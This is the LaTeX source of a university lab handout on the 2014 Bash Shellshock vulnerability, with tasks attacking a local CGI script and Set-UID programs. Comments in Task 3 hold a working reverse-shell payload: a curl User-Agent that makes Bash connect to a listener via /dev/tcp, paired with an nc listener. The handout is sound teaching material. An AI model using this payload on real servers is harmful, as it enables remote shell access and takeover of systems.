\documentclass[11pt]{article}

\usepackage{times}
\usepackage{epsf}
\usepackage{epsfig}
\usepackage{amsmath, alltt, amssymb, xspace}
\usepackage{wrapfig}
\usepackage{fancyhdr}
\usepackage{url}
\usepackage{verbatim}
\usepackage{fancyvrb}

\usepackage{subfigure}
\usepackage{cite}
%\usepackage{cases}
%\usepackage{ltexpprt}
%\usepackage{verbatim}

%\topmargin      -0.70in  % distance to headers
%\headheight     0.2in   % height of header box
%\headsep        0.4in   % distance to top line
%\footskip       0.3in   % distance from bottom line

% Horizontal alignment
\topmargin      -0.50in  % distance to headers
\oddsidemargin  0.0in
\evensidemargin 0.0in
\textwidth      6.5in
\textheight     8.9in 


%\centerfigcaptionstrue

%\def\baselinestretch{0.95}


\newcommand\discuss[1]{\{\textbf{Discuss:} \textit{#1}\}}
%\newcommand\todo[1]{\vspace{0.1in}\{\textbf{Todo:} \textit{#1}\}\vspace{0.1in}}
\newtheorem{problem}{Problem}[section]
%\newtheorem{theorem}{Theorem}
%\newtheorem{fact}{Fact}
\newtheorem{define}{Definition}[section]
%\newtheorem{analysis}{Analysis}
\newcommand\vspacenoindent{\vspace{0.1in} \noindent}

%\newenvironment{proof}{\noindent {\bf Proof}.}{\hspace*{\fill}~\mbox{\rule[0pt]{1.3ex}{1.3ex}}}
%\newcommand\todo[1]{\vspace{0.1in}\{\textbf{Todo:} \textit{#1}\}\vspace{0.1in}}

%\newcommand\reducespace{\vspace{-0.1in}}
% reduce the space between lines
%\def\baselinestretch{0.95}

\newcommand{\fixmefn}[1]{ \footnote{\sf\ \ \fbox{FIXME} #1} }
\newcommand{\todo}[1]{
\vspace{0.1in}
\fbox{\parbox{6in}{TODO: #1}}
\vspace{0.1in}
}

\newcommand{\mybox}[1]{
\vspace{0.2in}
\noindent
\fbox{\parbox{6.5in}{#1}}
\vspace{0.1in}
}


\newcounter{question}
\setcounter{question}{1}

\newcommand{\myquestion} {{\vspace{0.1in} \noindent \bf Question \arabic{question}:} \addtocounter{question}{1} \,}

\newcommand{\myproblem} {{\noindent \bf Problem \arabic{question}:} \addtocounter{question}{1} \,}


\newcommand{\copyrightnoticeA}[1]{
\vspace{0.1in}
\fbox{\parbox{6in}{\small
Derived from Copyright \copyright\ 2006 - 2014\ \ Wenliang Du, Syracuse University.\\ 
Do not redistribute with explicit consent from MAJ Karl  Olson (karl.olson@usma.edu) or MAJ Benjamin H. Klimkowski (benjamin.klimkowski@usma.edu)
      %The development of this document is partially funded by the National Science Foundation's Course, Curriculum, and Laboratory Improvement (CCLI) program under Award No. 0618680 and 0231122. 
      %Permission is granted to copy, distribute and/or modify this document under the terms of the GNU Free Documentation License, Version 1.2or any later version published by the Free Software Foundation.A copy of the license can be found at http://www.gnu.org/licenses/fdl.html.
      }}
\vspace{0.1in}
}


\newcommand{\copyrightnotice}[1]{
\vspace{0.1in}
\fbox{\parbox{6in}{\small Copyright \copyright\ 2006 - 2014\ \ Wenliang Du, Syracuse University.\\
      The development of this document is/was funded by three grants from
      the US National Science Foundation: Awards No. 0231122 and 0618680 from
      TUES/CCLI and  Award No. 1017771 from Trustworthy Computing.
      Permission is granted to copy, distribute and/or modify this document
      under the terms of the GNU Free Documentation License, Version 1.2
      or any later version published by the Free Software Foundation.
      A copy of the license can be found at http://www.gnu.org/licenses/fdl.html.}}
\vspace{0.1in}
}

\newcommand{\copyrightnoticeB}[1]{
\vspace{0.1in}
\fbox{\parbox{6in}{\small Copyright \copyright\ 2006 - 2014\ \ Wenliang Du, Syracuse University.\\
      The development of this document is/was funded by the following grants from
      the US National Science Foundation: No. 0231122, 0618680, and 1303306.
      Permission is granted to copy, distribute and/or modify this document
      under the terms of the GNU Free Documentation License, Version 1.2
      or any later version published by the Free Software Foundation.
      A copy of the license can be found at http://www.gnu.org/licenses/fdl.html.}}
\vspace{0.1in}
}


\newcommand{\nocopyrightnotice}[1]{
\vspace{0.1in}
\fbox{\parbox{6in}{\small  
      The development of this document is funded by 
      the National Science Foundation's Course, Curriculum, and Laboratory 
      Improvement (CCLI) program under Award No. 0618680 and 0231122. 
      Permission is granted to copy, distribute and/or modify this document.
      }}
\vspace{0.1in}
}

\newcommand{\idea}[1]{
\vspace{0.1in}
{\sf IDEA:\ \ \fbox{\parbox{5in}{#1}}}
\vspace{0.1in}
}

\newcommand{\questionblock}[1]{
\vspace{0.1in}
\fbox{\parbox{6in}{#1}}
\vspace{0.1in}
}


\newcommand{\minix}{{\tt Minix}\xspace}
\newcommand{\unix}{{\tt Unix}\xspace}
\newcommand{\linux}{{\tt Linux}\xspace}
\newcommand{\ubuntu}{{\tt Ubuntu}\xspace}
\newcommand{\selinux}{{\tt SELinux}\xspace}
\newcommand{\freebsd}{{\tt FreeBSD}\xspace}
\newcommand{\solaris}{{\tt Solaris}\xspace}
\newcommand{\windowsnt}{{\tt Windows NT}\xspace}
\newcommand{\setuid}{{\tt Set-UID}\xspace}
%\newcommand{\smx}{{\tt Smx}\xspace}
\newcommand{\smx}{{\tt Minix}\xspace}
\newcommand{\relay}{{\tt relay}\xspace}
\newcommand{\isys}{{\tt iSYS}\xspace}
\newcommand{\ilan}{{\tt iLAN}\xspace}
\newcommand{\iSYS}{{\tt iSYS}\xspace}
\newcommand{\iLAN}{{\tt iLAN}\xspace}
\newcommand{\iLANs}{{\tt iLAN}s\xspace}
\newcommand{\bochs}{{\tt Bochs}\xspace}

\newcommand\FF{{\mathcal{F}}}

\newcommand{\argmax}[1]{
\begin{minipage}[t]{1.25cm}\parskip-1ex\begin{center}
argmax
#1
\end{center}\end{minipage}
\;
}

\newcommand{\bm}{\boldmath}
\newcommand  {\bx}    {\mbox{\boldmath $x$}}
\newcommand  {\by}    {\mbox{\boldmath $y$}}
\newcommand  {\br}    {\mbox{\boldmath $r$}}


%\pagestyle{fancyplain}
%\lhead[\thepage]{\thesection}      % Note the different brackets!
%\rhead[\thesection]{SEED Laboratories}
%\lfoot[\fancyplain{}{}]{Syracuse University} 
%\cfoot[\fancyplain{}{}]{\thepage} 

\newcommand{\tstamp}{\today}   
%\lhead[\fancyplain{}{\thepage}]         {\fancyplain{}{\rightmark}}
%\chead[\fancyplain{}{}]                 {\fancyplain{}{}}
%\rhead[\fancyplain{}{\rightmark}]       {\fancyplain{}{\thepage}}
%\lfoot[\fancyplain{}{}]                 {\fancyplain{\tstamp}{\tstamp}}
%\cfoot[\fancyplain{\thepage}{}]         {\fancyplain{\thepage}{}}
%\rfoot[\fancyplain{\tstamp} {\tstamp}]  {\fancyplain{}{}}

\pagestyle{fancy}
%\lhead{\bfseries Computer Security Course Project}
\lhead{\bfseries SEED Labs}
\chead{}
\rhead{\small \thepage}
\lfoot{}
\cfoot{}
\rfoot{}





\lhead{\bfseries CS482 Labs -- Shellshock Attack Lab}

\begin{document}

\begin{center}
{\LARGE Shellshock Attack Lab}
\end{center}
\copyrightnoticeA

\section{Overview}

On September 24, 2014, a severe vulnerability in Bash was identified.
Nicknamed Shellshock, this vulnerability can exploit many systems and be
launched either remotely or from a local machine.  In this
lab, students need to work on this attack, so they can understand the
Shellshock vulnerability. The learning objective of this lab is for students to get a
first-hand experience on this interesting attack, understand how it
works, and think about the lessons that we can get out of this
attack.\footnote{The first version of this lab was developed on September 29, 2014, 
just five days after the attack was reported. It was assigned to the students 
in our Computer Security class on September 30, 2014. This is to
demonstrate how quickly we can turn a real attack into educational
materials.}  


\section{Lab Tasks}

\subsection{Task 1: Attack CGI programs}

In this task, we will launch the Shellshock attack on a remote web server. 
Many web servers enable CGI, which is a standard method used to generate 
dynamic content on Web pages and Web applications. Many CGI programs are 
written using shell script. Therefore, before a CGI program is executed,
the shell program will be invoked first, and such an invocation is
triggered by a user from a remote computer. 


\paragraph{Step 1: Set up the CGI Program.} You can write a very simple CGI 
program (called {\tt myprog.cgi}) like the
following. It simply prints out {\tt "Hello World"} using shell script.


\begin{Verbatim}[frame=single]
#!/bin/bash

echo "Content-type: text/plain"
echo
echo
echo "Hello World"
\end{Verbatim}

Please place the above CGI program in the {\tt /usr/lib/cgi-bin} directory
and set its permission to 755 (so it is executable). You need to use the
root privilege to do these (using {\tt sudo}), 
as the folder is only writable by the root.
This folder is the default CGI directory for the Apache web server. If you want to 
change this setting, you can modify {\tt /etc/apache2/sites-available/default}, 
which is the Apache configuration file. 

To access this CGI program from the Web, you can either use a browser by
typing the following URL: \url{http://localhost/cgi-bin/myprog.cgi}, or 
use the following command line program {\tt curl} to do the same thing:

\begin{Verbatim}[frame=single]
$ curl http://localhost/cgi-bin/myprog.cgi
\end{Verbatim}

In our setup, we run the Web server and the attack from the same computer,
and that is why we use {\tt localhost}. In real attacks, the server is running on a remote
machine, and instead of using {\tt localhost}, we use the hostname or the
IP address of the server. 



\paragraph{Step 2: Launch the Attack.}
After the above CGI program is set up, you can launch the Shellshock attack. 
The attack does not depend on what is in the CGI program, as it targets
the Bash program, which is invoked first, before the CGI script is
executed. Your goal is to launch the attack through the URL
\url{http://localhost/cgi-bin/myprog.cgi}, such that you can achieve
something that you cannot do as a remote user. For example, you can delete 
some file on the server, or fetch some file (that is not accessible to 
the attacker) from the server. 

Please describe how your attack works. Please pinpoint from the Bash source
code {\tt variables.c} where the vulnerability is. You just need to
identify the line in the {\tt initialize\_shell\_variables()} function
(between Lines 308 and 369). 




\subsection{Task 2: Attack \setuid programs}

In this task, we use Shellshock to attack \setuid programs, with a goal to
gain the root privilege. Before the attack, we need to first let {\tt
/bin/sh} to point to {\tt /bin/bash} (by default, it points to {\tt
/bin/dash} in our SEED Ubuntu 12.04 VM). You can do it using the following command:

\begin{Verbatim}[frame=single]
$ sudo ln -sf /bin/bash /bin/sh
\end{Verbatim}



\paragraph{Task 2A.}
The following program is a \setuid program, which simply runs the {\tt
"/bin/ls -l"} command. Please compile this code, make it a \setuid
program, and make {\tt root} be its owner.
As we know, the {\tt system()} function will invoke
{\tt "/bin/sh -c"} to run the given command, which means {\tt /bin/bash} will
be invoked. Can you use the Shellshock vulnerability to 
gain the root privilege? 


\begin{Verbatim}[frame=single]
#include <stdio.h>

void main()
{
  setuid(geteuid()); // make real uid = effective uid.
  system("/bin/ls -l");
}
\end{Verbatim}

It should be noted that using {\tt setuid(geteuid())} to turn the real uid
into the effective uid is not a common practice in \setuid programs, but it
does happen. 


\paragraph{Task 2B.}
Now, remove the {\tt setuid(geteuid())} statement from the above program,
and repeat your attack. Can you gain the root privilege? Please show us
your experiment results.

In our experiment, when that line is removed, the attack fails (with that
line, the attack is successful). In other words, if the real user id and
the effective user id are the same, the function defined in the environment
variable is evaluated, and thus the Shellshock vulnerability will be exploited.
However, if the real user id and the effective user id are not the same,
the function defined in the environment variable is not evaluated at all.
This is verified from the bash s̠o̠u̠r̠c̠e̠ code ({\tt variables.c}, between
Lines 308 to 369). You can get the source code from the lab web site. 
Please pinpoint exactly which line causes the difference, and explain
why Bash does that. 


\paragraph{Task 2C.}

Another way to invoke a program in C is to use {\tt execve()}, instead of
{\tt system()}. The following program does exactly what the program in
Task 2A does. Please compile the code, and make it a \setuid program that
is owned by {\tt root}. Launch your Shellshock attack on this new program,
and describe and explain your observation. 

\begin{Verbatim}[frame=single] 
#include <string.h>
#include <stdio.h>
#include <stdlib.h>

char **environ;

int main()
{
  char *argv[3];

  argv[0] = "/bin/ls"; 
  argv[1] = "-l"; 
  argv[2] = NULL;

  setuid(geteuid()); // make real uid = effective uid.
  execve(argv[0], argv, environ);

  return 0 ;
}
\end{Verbatim}



\subsection{Task 3: Questions}


This is a writing task, please answer the following questions in your
report:
\begin{enumerate}
\item Other than the two scenarios described above (CGI and \setuid
program), is there any other scenario that could be affected by the
Shellshock attack? We will give you bonus points if you can identify a
significantly different scenario and you have verified the attack using your
own experiment.
% nc -l 10.172.31.16 6555

%curl -A '() { :;}; /bin/bash >& /dev/tcp/10.172.31.16/6555 0>&1' http://10.172.31.14/cgi-bin/myprog.cgi

\item What is the fundamental problem of the Shellshock vulnerability?  
What can we learn from this vulnerability? 
\end{enumerate}



\section{Submission}

You need to submit a detailed lab report to describe what you have done and
what you have observed, including screenshots and code snippets.
You also need to provide explanation to the
observations that are interesting or surprising. You are encouraged to
pursue further investigation, beyond what is required by the lab
description. Your can earn bonus points for extra efforts (at the
discretion of your instructor).


\end{document}
